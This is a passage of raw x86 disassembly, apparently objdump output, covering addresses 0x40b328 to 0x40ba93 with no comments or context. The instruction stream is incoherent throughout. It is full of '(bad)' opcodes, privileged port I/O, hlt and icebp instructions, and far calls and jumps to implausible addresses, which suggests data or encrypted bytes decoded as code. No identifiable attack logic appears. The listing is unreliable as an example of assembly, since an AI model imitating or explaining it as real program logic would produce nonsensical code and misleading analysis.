  40b328:	sub    al,0x6f
  40b32a:	aas    
  40b32b:	(bad)  
  40b32d:	lea    esi,[ecx+0x49]
  40b330:	xor    eax,DWORD PTR [ebp+0x5f]
  40b333:	sete   BYTE PTR [ecx-0x7363b06d]
  40b33a:	sub    esp,DWORD PTR [edx-0x3b118563]
  40b340:	push   ecx
  40b341:	cmp    al,0xbc
  40b343:	sub    DWORD PTR [esi],0xffffff8c
  40b346:	mov    ah,0xc8
  40b348:	push   esi
  40b349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b34b:	bound  edx,QWORD PTR [esi-0x645bb724]
  40b351:	and    al,0x77
  40b353:	jle    0x40b317
  40b355:	outs   dx,DWORD PTR ds:[esi]
  40b356:	fist   WORD PTR ds:0x8c14a882
  40b35c:	push   edi
  40b35d:	pop    edi
  40b35e:	je     0x40b390
  40b360:	xchg   esp,eax
  40b361:	or     esp,esp
  40b363:	imul   ebp,DWORD PTR [edx-0x77],0x4da02c6f
  40b36a:	push   ds
  40b36b:	and    eax,0xdd71f5f7
  40b370:	call   FWORD PTR [ebx-0x21f63ed7]
  40b376:	jle    0x40b3b8
  40b378:	fadd   QWORD PTR [ebx]
  40b37a:	das    
  40b37b:	xchg   ebp,eax
  40b37c:	ja     0x40b3bb
  40b37e:	xor    ebp,DWORD PTR [ebx]
  40b380:	pop    es
  40b381:	jno    0x40b401
  40b383:	repnz sahf 
  40b385:	les    edi,FWORD PTR [edi+0x7c]
  40b388:	inc    edx
  40b389:	push   edx
  40b38a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b38b:	xchg   edx,eax
  40b38c:	fist   DWORD PTR [edi-0x4c]
  40b38f:	dec    esp
  40b390:	sbb    ch,BYTE PTR [ecx]
  40b392:	in     eax,0x74
  40b394:	jne    0x40b3c1
  40b396:	xor    al,BYTE PTR [edx-0x6f93ba]
  40b39c:	jle    0x40b39d
  40b39e:	inc    eax
  40b39f:	dec    ebx
  40b3a0:	jle    0x67f5d1f7
  40b3a6:	cmp    cl,BYTE PTR [ebx+0x31]
  40b3a9:	dec    edi
  40b3aa:	inc    eax
  40b3ab:	in     al,0x45
  40b3ad:	adc    BYTE PTR [edi-0x44bc04d5],bl
  40b3b3:	jmp    0xb6296550
  40b3b8:	fmul   st(0),st
  40b3ba:	push   ecx
  40b3bb:	imul   esp,DWORD PTR [ecx-0x6d040d58],0x1a32530a
  40b3c5:	jo     0x40b3b4
  40b3c7:	int3   
  40b3c8:	xchg   edi,eax
  40b3c9:	or     BYTE PTR [esi-0x78e38171],bh
  40b3cf:	shr    DWORD PTR [edx-0x76c85c33],1
  40b3d5:	cmp    DWORD PTR [edi-0x7f9af3a],esp
  40b3db:	mov    eax,ds:0xcfb92c7f
  40b3e0:	leave  
  40b3e1:	xchg   BYTE PTR [eax],dh
  40b3e3:	sbb    BYTE PTR [edi+edi*2+0x51e24ba3],bh
  40b3ea:	adc    BYTE PTR [ecx+0x5f],0x7
  40b3ee:	neg    bh
  40b3f0:	setl   BYTE PTR [ebx]
  40b3f3:	stos   BYTE PTR es:[edi],al
  40b3f4:	jp     0x40b466
  40b3f6:	mov    esi,ebp
  40b3f8:	adc    eax,0xc1f39feb
  40b3fd:	cmp    dh,BYTE PTR [edi-0x2b9b438c]
  40b403:	in     eax,0x37
  40b405:	push   ss
  40b406:	cmp    DWORD PTR [esi+0x401e8b3a],0xa3836aa3
  40b410:	les    edi,FWORD PTR [eax+0x10]
  40b413:	jecxz  0x40b3c3
  40b415:	lahf   
  40b416:	push   ebx
  40b417:	sub    ch,BYTE PTR [esi+edi*2]
  40b41a:	jge    0x40b3f6
  40b41c:	adc    DWORD PTR es:[edx+0xf6b265c],0x7c
  40b424:	mov    cl,0xda
  40b426:	sub    bl,BYTE PTR [edi-0x74]
  40b429:	xchg   ebp,eax
  40b42a:	jae    0x40b4a8
  40b42c:	ficomp WORD PTR [ebx]
  40b42e:	push   edx
  40b42f:	push   esi
  40b430:	je     0x40b48f
  40b432:	test   eax,0x5af8f405
  40b437:	cmp    ebp,0xffffff92
  40b43a:	in     eax,dx
  40b43b:	xchg   edi,eax
  40b43c:	mov    WORD PTR [edx-0xea05393],es
  40b442:	cld    
  40b443:	mov    gs,esi
  40b445:	nop
  40b446:	inc    esi
  40b447:	sahf   
  40b448:	dec    ebp
  40b449:	mov    eax,ds:0x686f1084
  40b44e:	inc    edi
  40b44f:	repnz mov WORD PTR [edx+0x77b5ced1],ds
  40b456:	or     al,0x3d
  40b458:	inc    eax
  40b459:	add    esp,DWORD PTR [ebp-0x49]
  40b45c:	clc    
  40b45d:	fdiv   DWORD PTR [ebx-0x74]
  40b460:	in     al,0xd8
  40b462:	dec    esi
  40b463:	push   ebp
  40b464:	inc    ecx
  40b465:	bound  eax,QWORD PTR [edx-0x7d]
  40b468:	shr    DWORD PTR gs:[ecx-0x15c0f41f],0x8a
  40b470:	inc    ecx
  40b471:	pop    ss
  40b472:	das    
  40b473:	call   0xf472cc0e
  40b478:	jmp    0xc846:0x3fdb0714
  40b47f:	test   al,0x99
  40b481:	repz xor eax,0x4c1bed88
  40b487:	call   0x31cb:0xaf4b58a7
  40b48e:	ss std 
  40b490:	icebp  
  40b491:	xor    DWORD PTR [ebx+eax*2-0x3a],ebp
  40b495:	out    dx,al
  40b496:	inc    eax
  40b497:	bound  esp,QWORD PTR ds:0xb8dfbaa8
  40b49d:	mov    dh,0xa3
  40b49f:	mov    ah,0x27
  40b4a1:	dec    ebx
  40b4a2:	and    al,0x14
  40b4a4:	cdq    
  40b4a5:	jmp    0xff6dadad
  40b4aa:	inc    ebp
  40b4ab:	pop    ds
  40b4ac:	and    BYTE PTR [ebp+0x26],al
  40b4af:	sbb    ecx,edx
  40b4b1:	call   0x4c7aefea
  40b4b6:	push   es
  40b4b7:	dec    edi
  40b4b8:	loopne 0x40b49d
  40b4ba:	mov    DWORD PTR [esi],esi
  40b4bc:	hlt    
  40b4bd:	inc    esp
  40b4be:	cmp    DWORD PTR [edi+edx*8+0x59],0x557fc40c
  40b4c6:	sti    
  40b4c7:	fsubr  DWORD PTR [esi+edx*4]
  40b4ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4cb:	pop    edi
  40b4cc:	faddp  st(1),st
  40b4ce:	jo     0x40b54b
  40b4d0:	ror    DWORD PTR [esi+0x57],0xce
  40b4d4:	out    0x2a,al
  40b4d6:	sbb    esi,esp
  40b4d8:	adc    al,BYTE PTR [esi+0x6fce6e04]
  40b4de:	cmp    al,0x7a
  40b4e0:	add    edx,DWORD PTR [esi+eiz*8-0x57701380]
  40b4e7:	xchg   esp,eax
  40b4e8:	sbb    eax,0x21
  40b4eb:	stc    
  40b4ec:	lods   al,BYTE PTR ds:[esi]
  40b4ed:	sar    DWORD PTR [edi-0x7f],cl
  40b4f0:	mov    ebx,0x31bd74ce
  40b4f5:	mov    ah,0x7b
  40b4f7:	retf   
  40b4f8:	add    edi,ebx
  40b4fa:	dec    esp
  40b4fb:	mov    esp,?
  40b4fd:	mov    dh,0xa9
  40b4ff:	fsub   DWORD PTR [ebp+0x77]
  40b502:	stos   BYTE PTR es:[edi],al
  40b503:	or     BYTE PTR [edx+0x54d3b9f4],dl
  40b509:	je     0x40b4c3
  40b50b:	popa   
  40b50c:	lock je 0x40b521
  40b50f:	popf   
  40b510:	mov    DWORD PTR [esi+0x32345d64],esp
  40b516:	lds    edi,FWORD PTR [ecx-0xa]
  40b519:	lds    esp,FWORD PTR [ebx-0x40cd1668]
  40b51f:	sub    BYTE PTR fs:0x6dfdaf92,al
  40b526:	cmp    ebp,DWORD PTR [edi-0x6d2e124f]
  40b52c:	aad    0xdb
  40b52e:	and    eax,0x8148475a
  40b533:	leave  
  40b534:	push   0x81df1d1a
  40b539:	and    bh,BYTE PTR ds:0xbd6e27dc
  40b53f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b540:	int3   
  40b541:	cmp    al,0x5d
  40b543:	push   ecx
  40b544:	imul   edx,DWORD PTR [ebx],0xffffffa4
  40b547:	jb     0x40b53f
  40b549:	dec    edi
  40b54a:	shr    DWORD PTR [ebp+0x15],1
  40b54d:	dec    eax
  40b54e:	add    al,0xc
  40b550:	jne    0x40b5a8
  40b552:	test   DWORD PTR [eax+eiz*2-0x45],0x45fb9ee6
  40b55a:	shr    eax,cl
  40b55c:	mov    ch,BYTE PTR ds:0xb4f7c341
  40b562:	lds    edx,FWORD PTR [edi+eiz*2]
  40b565:	aaa    
  40b566:	dec    esi
  40b567:	mov    bl,0x15
  40b569:	mov    ah,ch
  40b56b:	jl     0x40b5d2
  40b56d:	ficomp WORD PTR [ebx-0x53]
  40b570:	std    
  40b571:	mov    eax,0x2745be85
  40b576:	ins    DWORD PTR es:[edi],dx
  40b577:	push   edx
  40b578:	pop    ss
  40b579:	push   ebx
  40b57a:	and    BYTE PTR ds:0x3be4836e,dh
  40b580:	mov    esp,0xe0716a64
  40b585:	mov    ch,0xd8
  40b587:	fwait
  40b588:	and    al,0xea
  40b58a:	es adc eax,esi
  40b58d:	jmp    0x40b5f9
  40b58f:	inc    esi
  40b590:	pushf  
  40b591:	dec    esi
  40b592:	push   edx
  40b593:	push   es
  40b594:	and    DWORD PTR [ebx+0x2d],0x1771e9ae
  40b59b:	sbb    DWORD PTR [edi+0x5f],0xffffff86
  40b59f:	inc    ebp
  40b5a0:	je     0x40b5c4
  40b5a2:	adc    esi,0x65
  40b5a5:	add    edx,DWORD PTR [ebx+edi*8-0x6b1cbe6f]
  40b5ac:	in     eax,0x75
  40b5ae:	jo     0x40b621
  40b5b0:	push   ebx
  40b5b1:	xchg   BYTE PTR [eax+0x5f73008b],dh
  40b5b7:	cmp    BYTE PTR [edi],dh
  40b5b9:	xchg   esp,eax
  40b5ba:	mov    edx,0xd88be363
  40b5bf:	lds    ebx,FWORD PTR [edx+0x27]
  40b5c2:	fld    TBYTE PTR [esi+0x1d]
  40b5c5:	je     0x40b626
  40b5c7:	sub    al,0x2f
  40b5c9:	pop    esi
  40b5ca:	outs   dx,BYTE PTR ds:[esi]
  40b5cb:	shl    DWORD PTR [eax+edi*8-0x39d70c85],1
  40b5d2:	mov    edx,0xb405d371
  40b5d7:	cmp    al,BYTE PTR [ecx-0x8b39a2d]
  40b5dd:	sti    
  40b5de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5df:	es inc ebp
  40b5e1:	scas   eax,DWORD PTR es:[edi]
  40b5e2:	pop    es
  40b5e3:	fdivr  DWORD PTR [edi+eax*1]
  40b5e6:	sub    edx,DWORD PTR [esi+0x7a]
  40b5e9:	inc    ecx
  40b5ea:	in     al,dx
  40b5eb:	mov    esi,DWORD PTR [eax+0x2e]
  40b5ee:	adc    eax,0x4c998c86
  40b5f3:	dec    ebp
  40b5f4:	lods   al,BYTE PTR ds:[esi]
  40b5f5:	repnz adc cl,BYTE PTR [edx+0x650216b5]
  40b5fc:	in     al,0x8c
  40b5fe:	sub    al,0xd
  40b600:	rcr    BYTE PTR [edi+ebx*8],0x3f
  40b604:	jmp    0x86fd200e
  40b609:	gs pop esp
  40b60b:	sbb    ch,bl
  40b60d:	dec    ecx
  40b60e:	jae    0x40b622
  40b610:	or     eax,0x5d6ba9d0
  40b615:	in     al,0xbd
  40b617:	xchg   ecx,eax
  40b618:	xchg   esi,eax
  40b619:	mov    eax,ds:0x9b866df6
  40b61e:	aad    0x3b
  40b620:	xchg   BYTE PTR [esi+edx*8+0x61a147e2],bl
  40b627:	aas    
  40b628:	das    
  40b629:	xor    al,0x28
  40b62b:	inc    ecx
  40b62c:	jge    0x40b5fd
  40b62e:	dec    ecx
  40b62f:	mov    ds:0x70097310,al
  40b634:	dec    esi
  40b635:	popa   
  40b636:	mov    ebx,0xc2ecbb28
  40b63b:	push   esp
  40b63c:	jp     0x40b611
  40b63e:	rcr    BYTE PTR [esp+edi*2-0x25],0x56
  40b643:	push   0x18ecd8f8
  40b648:	mov    dh,0x29
  40b64a:	icebp  
  40b64b:	in     al,dx
  40b64c:	ins    BYTE PTR es:[edi],dx
  40b64d:	(bad)  
  40b64e:	mov    esp,0x6c84b70f
  40b653:	hlt    
  40b654:	or     edx,DWORD PTR [edi]
  40b656:	ds out 0xdd,eax
  40b659:	or     esp,ebx
  40b65b:	pop    edx
  40b65c:	out    dx,eax
  40b65d:	(bad)  
  40b65e:	aad    0x6
  40b660:	or     bl,BYTE PTR [edi]
  40b662:	dec    ecx
  40b663:	push   edx
  40b664:	(bad)  
  40b665:	sub    al,0x2c
  40b667:	shl    BYTE PTR [ecx+0x76],cl
  40b66a:	inc    ecx
  40b66b:	stos   DWORD PTR es:[edi],eax
  40b66c:	xor    eax,0xbeed451b
  40b671:	xchg   BYTE PTR [ebp+0x3d],al
  40b674:	mov    bl,0x20
  40b676:	mov    esp,DWORD PTR [ebp+0x14ab7503]
  40b67c:	pop    esi
  40b67d:	inc    esi
  40b67e:	sbb    BYTE PTR [edi],ah
  40b680:	repnz popa 
  40b682:	pop    edi
  40b683:	lea    ebx,[ebx]
  40b685:	aaa    
  40b686:	push   ss
  40b687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b688:	jno    0x40b6e2
  40b68a:	ins    DWORD PTR es:[edi],dx
  40b68b:	test   eax,0xa2e105b1
  40b690:	lods   eax,DWORD PTR ds:[esi]
  40b691:	add    DWORD PTR [eax+0x48dc2480],0xd72b7837
  40b69b:	shl    BYTE PTR [eax],1
  40b69d:	xor    ebx,esp
  40b69f:	jle    0x40b6d0
  40b6a1:	xchg   ebp,eax
  40b6a2:	push   edx
  40b6a3:	es ret 
  40b6a5:	gs jge 0x40b684
  40b6a8:	adc    eax,DWORD PTR [ecx-0x19]
  40b6ab:	add    ch,BYTE PTR [ecx+0x7c]
  40b6ae:	mov    al,0xd4
  40b6b0:	push   0xb
  40b6b2:	in     eax,0x4f
  40b6b4:	xor    BYTE PTR [ecx],ah
  40b6b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b7:	xchg   ebp,eax
  40b6b8:	sbb    eax,0x20f82322
  40b6bd:	das    
  40b6be:	cmp    BYTE PTR [esp+eax*2-0x4cda372e],dh
  40b6c5:	call   0xa3a78b0e
  40b6ca:	mov    eax,ds:0x9b53b12b
  40b6cf:	jmp    0x40b6c6
  40b6d1:	sti    
  40b6d2:	(bad)  
  40b6d3:	dec    edi
  40b6d4:	mov    WORD PTR [edx],gs
  40b6d6:	xor    DWORD PTR [ecx+0x53],edi
  40b6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6da:	mov    dl,0xf3
  40b6dc:	mov    cs,WORD PTR [eax+0x17c8be7c]
  40b6e2:	cli    
  40b6e3:	loope  0x40b6b0
  40b6e5:	not    al
  40b6e7:	lods   eax,DWORD PTR ds:[esi]
  40b6e8:	test   eax,0xf5bd7a4f
  40b6ed:	adc    BYTE PTR [ebx+0xf],bl
  40b6f0:	xchg   ecx,eax
  40b6f1:	repz int3 
  40b6f3:	dec    edi
  40b6f4:	cli    
  40b6f5:	cmp    eax,edi
  40b6f7:	jge    0x40b770
  40b6f9:	push   0x81d9754e
  40b6fe:	dec    esi
  40b6ff:	mov    gs,WORD PTR [eax]
  40b701:	dec    edx
  40b702:	sub    dl,BYTE PTR [edx-0x5]
  40b705:	(bad)  
  40b707:	inc    ebp
  40b708:	adc    eax,esi
  40b70a:	adc    eax,0x4f3d62b6
  40b70f:	icebp  
  40b710:	bound  ebp,QWORD PTR [eax-0x6182f441]
  40b716:	inc    ecx
  40b717:	stos   BYTE PTR es:[edi],al
  40b718:	and    BYTE PTR [edi+esi*4-0x48],bl
  40b71c:	dec    ecx
  40b71d:	das    
  40b71e:	xchg   ebp,eax
  40b71f:	dec    eax
  40b720:	popa   
  40b721:	mov    bl,0xb7
  40b723:	xor    al,0xd1
  40b725:	mov    esi,0x71dc6a62
  40b72a:	mov    al,dh
  40b72c:	pop    edx
  40b72d:	addr16 dec ecx
  40b72f:	aam    0x63
  40b731:	mov    BYTE PTR [ebp+0xf4ab774],0xc6
  40b738:	aaa    
  40b739:	pop    esi
  40b73a:	ror    DWORD PTR [esi],0x6e
  40b73d:	pcmpgtw mm0,QWORD PTR [edi+0x2fefda72]
  40b744:	xor    DWORD PTR [eax-0x61],ebx
  40b747:	inc    ebx
  40b748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b749:	clc    
  40b74a:	in     eax,dx
  40b74b:	(bad)  
  40b74c:	xchg   esp,eax
  40b74d:	cwde   
  40b74e:	sub    ebx,DWORD PTR [ebp+0xda81b45]
  40b754:	shr    BYTE PTR [edx+eiz*4],cl
  40b757:	add    al,0xbf
  40b759:	push   es
  40b75a:	(bad)
  40b75e:	data16 stc 
  40b760:	inc    edi
  40b761:	cwde   
  40b762:	jne    0x40b797
  40b764:	fcmovbe st,st(2)
  40b766:	inc    edx
  40b767:	mov    DWORD PTR [ebx],esi
  40b769:	les    esp,FWORD PTR [ecx]
  40b76b:	mov    ch,0x1b
  40b76d:	adc    DWORD PTR [edx],edx
  40b76f:	mov    edx,0xbdacd20c
  40b774:	call   0xfb06:0x5cfe925a
  40b77b:	(bad)  
  40b77d:	out    dx,eax
  40b77e:	mov    dh,0xd9
  40b780:	das    
  40b781:	aaa    
  40b782:	fsubr  DWORD PTR [eax+0x6d]
  40b785:	popf   
  40b786:	test   edx,0x80d7741b
  40b78c:	xchg   ecx,eax
  40b78d:	xchg   ecx,eax
  40b78e:	retw   0xafac
  40b792:	rcl    dl,cl
  40b794:	sub    edi,esi
  40b796:	scas   eax,DWORD PTR es:[edi]
  40b797:	pop    ds
  40b798:	(bad)  
  40b799:	sbb    dl,BYTE PTR [eax-0x40]
  40b79c:	cwde   
  40b79d:	mov    al,ds:0x6dcd9a8c
  40b7a2:	(bad)  
  40b7a3:	dec    ecx
  40b7a4:	add    ch,BYTE PTR [ecx-0x690998c]
  40b7aa:	sub    al,0x6e
  40b7ac:	fist   DWORD PTR [ecx-0x24]
  40b7af:	inc    esp
  40b7b0:	and    al,0x49
  40b7b2:	push   ebp
  40b7b3:	push   ecx
  40b7b4:	add    bl,0x72
  40b7b7:	pusha  
  40b7b8:	adc    ch,al
  40b7ba:	icebp  
  40b7bb:	mov    WORD PTR [ecx+0x74],ss
  40b7be:	js     0x40b7a5
  40b7c0:	sub    bh,bl
  40b7c2:	add    al,0x36
  40b7c4:	in     al,dx
  40b7c5:	cmp    eax,0xcde14510
  40b7ca:	cmp    bl,bl
  40b7cc:	push   ds
  40b7cd:	lods   eax,DWORD PTR ds:[esi]
  40b7ce:	sbb    bh,dl
  40b7d0:	in     al,dx
  40b7d1:	lods   eax,DWORD PTR ds:[esi]
  40b7d2:	cmp    esp,DWORD PTR [ebx]
  40b7d4:	fsubr  DWORD PTR [ebp+0x68]
  40b7d7:	ja     0x40b7f6
  40b7d9:	xor    al,0x85
  40b7db:	(bad)  
  40b7dd:	cmp    eax,0x3a5f4584
  40b7e2:	mov    WORD PTR [esi+0x115c8cb6],?
  40b7e8:	call   0x1d65:0x77e5db4c
  40b7ef:	sti    
  40b7f0:	clc    
  40b7f1:	aam    0xf4
  40b7f3:	dec    edi
  40b7f4:	mov    eax,ds:0x5b3a20c7
  40b7f9:	sub    ebp,esi
  40b7fb:	push   0x20
  40b7fd:	pop    ebp
  40b7fe:	push   esi
  40b7ff:	test   BYTE PTR [ebx+0x29c44cab],ah
  40b805:	mov    al,BYTE PTR [edi-0xa]
  40b808:	pop    ecx
  40b809:	push   es
  40b80a:	mov    dl,0xdc
  40b80c:	jo     0x40b830
  40b80e:	rcr    DWORD PTR [edi],1
  40b810:	push   ecx
  40b811:	in     eax,dx
  40b812:	dec    ecx
  40b813:	mov    dh,0xe7
  40b815:	cwde   
  40b816:	add    DWORD PTR [edx-0x6d33336],eax
  40b81c:	sbb    eax,0x483e8533
  40b821:	mov    ds:0xecccf097,eax
  40b826:	push   esi
  40b827:	adc    al,0xd9
  40b829:	and    DWORD PTR [edx+0x1f],ebx
  40b82c:	xchg   esp,eax
  40b82d:	call   0x92e5:0xbf239c5b
  40b834:	(bad)  
  40b835:	fidiv  DWORD PTR [esi+eiz*4+0x2]
  40b839:	cdq    
  40b83a:	add    eax,0x2311f0d
  40b83f:	out    0x3a,eax
  40b841:	pushf  
  40b842:	mov    esi,0xa93c27ff
  40b847:	xchg   edi,eax
  40b848:	xchg   edi,eax
  40b849:	mov    ebx,DWORD PTR [ebp+edi*1+0x79]
  40b84d:	test   eax,0x92d8b395
  40b852:	mov    ecx,0x9bc48f2f
  40b858:	push   ds
  40b859:	(bad)  
  40b85a:	cld    
  40b85b:	imul   edi,ecx,0x68
  40b85e:	addr16 jp 0x40b806
  40b861:	loopne 0x40b87c
  40b863:	sbb    DWORD PTR [ecx-0x50],esi
  40b866:	sbb    esp,esi
  40b868:	push   ecx
  40b869:	dec    ecx
  40b86a:	xchg   ecx,eax
  40b86b:	rol    DWORD PTR [ecx+0x41],cl
  40b86e:	xchg   ebp,eax
  40b86f:	mov    esi,0x1762985b
  40b874:	jb     0x40b7fb
  40b876:	pushf  
  40b877:	jae    0x40b8ca
  40b879:	retf   
  40b87a:	mov    al,0x96
  40b87c:	mov    ds,WORD PTR [edi+0x7ac412a5]
  40b882:	inc    esi
  40b883:	les    ecx,FWORD PTR [esi+0x6d426176]
  40b889:	pusha  
  40b88a:	jns    0x40b8c6
  40b88c:	add    edi,ebp
  40b88e:	in     eax,dx
  40b88f:	and    dl,bl
  40b891:	std    
  40b892:	stc    
  40b893:	push   edx
  40b894:	lea    esp,[edi-0x5e]
  40b897:	fisttp QWORD PTR [ecx-0x220e4d29]
  40b89d:	cwde   
  40b89e:	xor    bh,BYTE PTR [edi-0x35]
  40b8a1:	popa   
  40b8a2:	addr16 je 0x40b85e
  40b8a5:	xor    dh,dl
  40b8a7:	add    al,0x29
  40b8a9:	add    BYTE PTR [edi-0x5772e0b1],bl
  40b8af:	xchg   DWORD PTR [ebx],edx
  40b8b1:	scas   al,BYTE PTR es:[edi]
  40b8b2:	outs   dx,DWORD PTR ds:[esi]
  40b8b3:	faddp  st(0),st
  40b8b5:	popa   
  40b8b6:	inc    ebp
  40b8b7:	mov    eax,ds:0xa0457576
  40b8bc:	pusha  
  40b8bd:	mov    ebx,0x6c7c67a9
  40b8c2:	mov    dh,0x9e
  40b8c4:	xor    DWORD PTR [edi],0xffffff91
  40b8c7:	pusha  
  40b8c8:	dec    esp
  40b8c9:	rcl    DWORD PTR [edx-0x31172a9d],cl
  40b8cf:	and    DWORD PTR [edx+0x499c6212],ebp
  40b8d5:	adc    eax,0xf578bdd4
  40b8da:	call   0x51f06cf3
  40b8df:	mov    esp,eax
  40b8e1:	std    
  40b8e2:	data16 (bad) 
  40b8e4:	aam    0x95
  40b8e6:	aad    0x7c
  40b8e8:	xchg   esp,eax
  40b8e9:	aas    
  40b8ea:	sub    eax,0x7fb7fc14
  40b8ef:	cs mov dl,0x72
  40b8f2:	push   ecx
  40b8f3:	and    ch,BYTE PTR ds:0x40322451
  40b8f9:	mov    ch,0x16
  40b8fb:	icebp  
  40b8fc:	js     0x40b95a
  40b8fe:	outs   dx,BYTE PTR ds:[esi]
  40b8ff:	mov    bh,0x4a
  40b901:	xchg   esi,esp
  40b903:	scas   eax,DWORD PTR es:[edi]
  40b904:	mov    cl,0x8c
  40b906:	xor    BYTE PTR ds:0xe0630aab,bh
  40b90c:	mov    edx,0x501f69ba
  40b911:	adc    BYTE PTR [edi],ch
  40b913:	out    dx,al
  40b914:	test   BYTE PTR [edx-0x4d],bh
  40b917:	sar    eax,1
  40b919:	loope  0x40b8e7
  40b91b:	push   edx
  40b91c:	out    0x2e,eax
  40b91e:	ret    0x501f
  40b921:	iret   
  40b922:	daa    
  40b923:	jecxz  0x40b943
  40b925:	adc    ecx,DWORD PTR [ebx]
  40b927:	test   dh,dl
  40b929:	inc    esi
  40b92a:	(bad)  
  40b92b:	(bad)  [ecx]
  40b92d:	in     al,0xd
  40b92f:	test   al,0xc8
  40b931:	dec    esp
  40b932:	mov    ecx,0x438c0b05
  40b937:	mov    dh,0xf3
  40b939:	add    ch,BYTE PTR [ecx]
  40b93b:	xor    bl,bl
  40b93d:	xor    al,dh
  40b93f:	cmc    
  40b940:	les    ebp,FWORD PTR [ebp+0x2802b075]
  40b946:	mov    cl,0x59
  40b948:	int    0xaa
  40b94a:	test   DWORD PTR [edi+0x66dcf285],ebx
  40b950:	imul   eax,ebx,0x7093caf8
  40b956:	pop    es
  40b957:	jle    0x40b9d6
  40b959:	and    edi,DWORD PTR [edx+0x45]
  40b95c:	mov    ah,0x18
  40b95e:	into   
  40b95f:	xchg   ecx,eax
  40b960:	adc    dl,BYTE PTR [edi-0x4224146d]
  40b966:	and    BYTE PTR [edx],ah
  40b968:	jp     0x40b997
  40b96a:	test   DWORD PTR [edx+0x18],esp
  40b96d:	neg    DWORD PTR [edx-0x465cf2f0]
  40b973:	test   al,0xfb
  40b975:	clc    
  40b976:	dec    ebp
  40b977:	cmc    
  40b978:	addr16 sub al,0xc4
  40b97b:	jp     0x40b9ec
  40b97d:	pusha  
  40b97e:	sub    BYTE PTR [ecx-0x61],0x33
  40b982:	adc    esp,esp
  40b984:	out    0x97,al
  40b986:	shl    DWORD PTR [eax-0x59],0x24
  40b98a:	fwait
  40b98b:	push   es
  40b98c:	xchg   edi,eax
  40b98d:	mov    ecx,0x5d3aea37
  40b992:	cs adc bh,al
  40b995:	(bad)  
  40b997:	mov    edx,DWORD PTR cs:[ebp+0x20904c17]
  40b99e:	mov    eax,0x491411e2
  40b9a3:	fcomp  st(3)
  40b9a5:	test   DWORD PTR [ebx],ecx
  40b9a7:	push   cs
  40b9a8:	call   0xb101:0x98ac6be1
  40b9af:	cdq    
  40b9b0:	push   ds
  40b9b1:	lea    ebx,[edi-0x65]
  40b9b4:	popf   
  40b9b5:	push   ss
  40b9b6:	mov    bl,0x72
  40b9b8:	pop    eax
  40b9b9:	aas    
  40b9ba:	inc    ecx
  40b9bb:	shl    BYTE PTR [edi-0x5d259fb],cl
  40b9c1:	jae    0x40b961
  40b9c3:	(bad)  
  40b9c4:	sub    DWORD PTR [esi+ebp*2],ebx
  40b9c7:	inc    ecx
  40b9c8:	sbb    dl,BYTE PTR [edx+esi*2-0x14de119a]
  40b9cf:	push   es
  40b9d0:	and    DWORD PTR [ebp-0x1c],esi
  40b9d3:	dec    ebx
  40b9d4:	adc    BYTE PTR fs:[ecx+esi*8],dh
  40b9d8:	dec    esi
  40b9d9:	lods   al,BYTE PTR ds:[esi]
  40b9da:	in     eax,dx
  40b9db:	repz jae 0x40b9ee
  40b9de:	jp     0x40b98f
  40b9e0:	jg     0x40b990
  40b9e2:	lahf   
  40b9e3:	mov    ch,0xd
  40b9e5:	push   es
  40b9e6:	idiv   edx
  40b9e8:	pop    eax
  40b9e9:	popf   
  40b9ea:	inc    esp
  40b9eb:	test   BYTE PTR [ebp-0x3f8e8b78],bl
  40b9f1:	mov    ah,0x4e
  40b9f3:	test   DWORD PTR [eax+0x7],eax
  40b9f6:	push   ecx
  40b9f7:	nop
  40b9f8:	jecxz  0x40b97a
  40b9fa:	push   esi
  40b9fb:	and    eax,0xe69c569c
  40ba00:	out    dx,al
  40ba01:	out    0xba,eax
  40ba03:	sub    esp,ebx
  40ba05:	sub    eax,0x6ec1e41e
  40ba0a:	sub    al,0x4c
  40ba0c:	adc    eax,0x28e7896e
  40ba11:	mov    dh,0xea
  40ba13:	dec    edi
  40ba14:	ret    0x93a0
  40ba17:	jp     0x40b9fe
  40ba19:	out    dx,al
  40ba1a:	cmp    BYTE PTR [edx+0x17],cl
  40ba1d:	mov    edx,0x42d15744
  40ba22:	or     eax,0x17bc996b
  40ba27:	cwde   
  40ba28:	sbb    BYTE PTR [edi-0x1],bh
  40ba2b:	retf   0x13c0
  40ba2e:	fmul   st(3),st
  40ba30:	xor    BYTE PTR [ebx+0x38],ah
  40ba33:	cmp    al,0x74
  40ba35:	(bad)  
  40ba36:	jmp    0x71eb0898
  40ba3b:	xor    eax,0x8de68e02
  40ba40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba41:	shl    bl,cl
  40ba43:	mov    ebp,0xd16d8043
  40ba48:	cmp    BYTE PTR [edi+ecx*8],0x25
  40ba4c:	ret    0xa3a9
  40ba4f:	inc    edx
  40ba50:	cmp    eax,0xca939c62
  40ba55:	int3   
  40ba56:	jle    0x40ba70
  40ba58:	jbe    0x40ba6d
  40ba5a:	inc    ebx
  40ba5b:	popf   
  40ba5c:	inc    edi
  40ba5d:	outs   dx,DWORD PTR ds:[esi]
  40ba5e:	(bad)  
  40ba60:	add    DWORD PTR [edi+0x4134d8a0],edi
  40ba66:	cmp    al,0x9c
  40ba68:	mov    bh,0x8f
  40ba6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba6b:	std    
  40ba6c:	push   es
  40ba6d:	or     eax,0x2978732e
  40ba72:	mov    bh,0xfb
  40ba74:	sbb    DWORD PTR fs:[edi-0x1a3f2f2d],ebx
  40ba7b:	pop    edi
  40ba7c:	retf   0x3a14
  40ba7f:	repz iret 
  40ba81:	lods   eax,DWORD PTR ds:[esi]
  40ba82:	cmp    DWORD PTR [edi-0x41],ecx
  40ba85:	mov    bl,0x7d
  40ba87:	pusha  
  40ba88:	or     ch,BYTE PTR [ebp-0x2f]
  40ba8b:	jecxz  0x40ba76
  40ba8d:	dec    esi
  40ba8e:	cmp    BYTE PTR [ebx+0x1],0x2a
  40ba92:	pop    ds
  40ba93:	jp     0x40bade
